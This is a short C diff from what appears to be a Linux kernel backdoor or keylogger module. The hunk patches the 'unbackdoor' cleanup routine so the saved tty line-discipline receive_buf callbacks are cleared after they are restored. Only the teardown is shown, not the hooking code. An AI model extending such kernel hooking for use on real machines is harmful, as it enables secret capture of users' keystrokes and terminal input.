@@ -42,9 +42,11 @@ unbackdoor(void)
         if (current_receive_buf2) {
             while (atomic_read(&receive_buf2_count) > 0);
             tty->ldisc->ops->receive_buf2 = current_receive_buf2;
+            current_receive_buf2 = NULL;
         } else if (current_receive_buf) {
             while (atomic_read(&receive_buf_count) > 0);
             tty->ldisc->ops->receive_buf = current_receive_buf;
+            current_receive_buf = NULL;
         }
 
         tty = NULL;
